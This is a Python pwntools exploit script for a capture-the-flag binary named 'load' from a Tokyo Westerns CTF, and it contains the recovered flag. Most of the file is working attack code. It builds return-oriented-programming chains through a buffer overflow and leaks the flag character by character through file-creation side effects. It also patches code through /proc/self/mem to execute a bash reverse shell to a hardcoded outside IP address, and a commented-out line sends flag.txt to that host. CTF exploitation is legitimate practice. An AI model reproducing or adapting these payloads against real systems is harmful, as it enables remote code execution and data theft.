#!/usr/bin/env python

from __future__ import print_function
from pwn import *

context.update(os='linux', arch='amd64',
	# log_level='debug',
)

PREFIX = '/home/load/ppp'

elf = ELF('./load')
rop = ROP('./load')
def connect():
	if args['TRACE']:
		return process(['strace', './load'])
	elif args['PROC'] and not args['HOST']:
		return process('./load')
	else:
		return remote(args['HOST'] or 'localhost', args['PORT'] or 34835)

def indcall(addr, rdx=0, rsi=0, edi=0):
    # abuse init to call a function

    # big register load: rbx, rbp, r12, r13, r14, r15
    res = [0x00400a6a, 0, 1, addr, rdx, rsi, edi]
    # rdx <- r13
    # rsi <- r14
    # edi <- r15d
    # call [r12 + rbx*8]
    res += [0x400A50]
    # do the big register load again
    res += [0] * 7
    return ''.join(p64(x) for x in res)

bss_addr = 0x601100
read_to_syscall_off = 0xf
filename_addr = 0x601040
read_got = 0x600fc8
open_got = 0x600ff0
lseek_got = 0x600FB8

def read(fd, buf, length):
	return indcall(read_got, length, buf, fd)

def lseek(fd, offset, whence):
	return indcall(lseek_got, whence, offset, fd)

def dump_prefix(length):
	t = connect()

	# plan: open files with prefixes of the flag and then check if they exist

	flag_filename_addr = filename_addr + 0x10
	toopen = filename_addr + 0x20
	toread_into = toopen + len(PREFIX)
	filename = flat(
		'/dev/stdin\x00'.ljust(0x10, '\x00'),
		'flag.txt\x00'.ljust(0x10, '\x00'),
		PREFIX,
		'\x00' * 0x50,
	)

	rop.call('open', [flag_filename_addr, 0])
	# load length into rdx
	rop.raw(indcall(read_got, length, toread_into, 0)) # call read 
	rop.raw(indcall(open_got, rdx=0x1ff, rsi=os.O_WRONLY | os.O_CREAT, edi=toopen))
	rop.call('close', [0])
	rop.call('close', [1])
	log.debug(rop.dump())

	t.sendline(filename)
	t.sendline('0')
	t.sendline('1024')
	# raw_input()
	t.send('a' * 0x38 + str(rop))
	# raw_input()
	t.clean(timeout=5)
	t.close()

def reverse_shell(read_to_syscall_off):
	t = connect()

	bss_load = bss_addr + read_to_syscall_off

	command_to_execute = 'bash -i >& /dev/tcp/128.237.218.123/8080 0>&1'
	# command_to_execute = 'cat flag.txt > /dev/tcp/128.237.218.123/8080'
	# command_to_execute = 'sleep 30'
	mem_filename_addr = filename_addr + 0x10

	argv_addr = filename_addr + 0x20
	binsh_addr = argv_addr + 0x20

	filename = flat(
		'/dev/stdin\x00'.ljust(0x10, '\x00'),
		'/proc/self/mem\x00'.ljust(0x10, '\x00'),
		p64(binsh_addr),
		p64(binsh_addr + 10),
		p64(binsh_addr + 10 + 3),
		p64(0),
		'/bin/bash\x00-c\x00',
		command_to_execute,
		'\x00',
	)

	log.info('Filename %d', len(filename))
	assert len(filename) < 0x80

	rop.call('open', [mem_filename_addr, 0])
	rop.raw(lseek(0, read_got, 0))
	rop.raw(read(0, bss_load, 8))
	rop.raw(lseek(0, bss_load, 0)) # set rax = bss_load
	rop.raw(0x0000000000400a82) # add byte ptr [rax], al; sub rsp, 8; add rsp, 8; ret; )
	rop.raw(lseek(0, 59, 0)) # set rax = 59
	rop.raw(indcall(bss_load, edi=binsh_addr, rsi=argv_addr, rdx=0))

	t.sendline(filename)
	t.sendline('0')
	t.sendline('1024')
	t.send('a' * 0x38 + str(rop))
	t.clean(timeout=5)

	t.close()

def check_file(s):
	log.info('CHECKING %s', PREFIX+s)
	t = connect()
	t.sendline(PREFIX + s)
	t.sendline('0')
	t.sendline('0')
	result = t.clean(timeout=5)
	t.close()
	log.info(result)

	return 'You can\'t' not in result

def dump_flag(found=''):
	while '}' not in found:
		dump_prefix(len(found) + 1)

		# chars = [ch for ch in (string.ascii_uppercase + '{}') if check_file(found + ch)]
		chars = [ch for ch in string.printable if check_file(found + ch)]
		if len(chars) != 1:
			log.error('NOT FOUND (%s) %s', found, chars)
		else:
			found += chars[0]
	log.info('Done %s', found)
	return found

# dump_prefix(len(found) + 1)

# dump_prefix(0)
# dump_prefix(0)
# dump_prefix(0)

reverse_shell(int(args['OFF']))

# TWCTF{pr0cf5_15_h1ghly_fl3x1bl3}
# python exploit.py HOST=pwn1.chal.ctf.westerns.tokyo OFF=14

# for off in xrange(5, 30):
# 	log.info('Trying offset %d', off)
# 	reverse_shell(off)
